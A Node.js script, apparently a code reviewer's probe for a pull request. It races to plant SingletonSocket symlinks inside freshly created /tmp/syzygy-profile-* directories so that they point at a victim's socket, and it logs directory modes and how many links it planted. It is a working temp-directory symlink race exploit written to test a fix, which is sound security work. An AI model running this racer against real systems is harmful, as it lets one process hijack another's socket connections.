// Round-2 reviewer's same-user racer for the F1 probe (PR 515): watches /tmp and, as soon as a
// syzygy-profile-* root appears, plants <root>/profile/SingletonSocket and <root>/profile-{0..127}/SingletonSocket
// pointing at the victim's socket. Records each root it saw with its mode, and how many links it planted.
// Usage: node racer.mjs <victim> <out.json>   (stops on SIGTERM and writes <out.json>)
import { mkdirSync, statSync, symlinkSync, watch, writeFileSync } from 'node:fs';
import { join } from 'node:path';

const [victim, out] = process.argv.slice(2);
const seen = [];
const children = ['profile', ...Array.from({ length: 128 }, (_, i) => `profile-${i}`)];
const watcher = watch('/tmp', (_event, name) => {
  if (typeof name !== 'string' || !name.startsWith('syzygy-profile-')) return;
  const root = join('/tmp', name);
  if (seen.some((s) => s.root === root)) return;
  const record = { root, mode: null, planted: 0, errors: {} };
  seen.push(record);
  try { record.mode = (statSync(root).mode & 0o7777).toString(8); } catch (e) { record.errors.stat = e.code; }
  for (const child of children) {
    try {
      mkdirSync(join(root, child));
      symlinkSync(join(victim, 'SingletonSocket'), join(root, child, 'SingletonSocket'));
      record.planted += 1;
    } catch (e) { record.errors[e.code] = (record.errors[e.code] ?? 0) + 1; }
  }
});
writeFileSync(`${out}.ready`, '');
process.on('SIGTERM', () => {
  watcher.close();
  writeFileSync(out, JSON.stringify({ roots: seen.length, plantedTotal: seen.reduce((n, s) => n + s.planted, 0), seen }));
  process.exit(0);
});
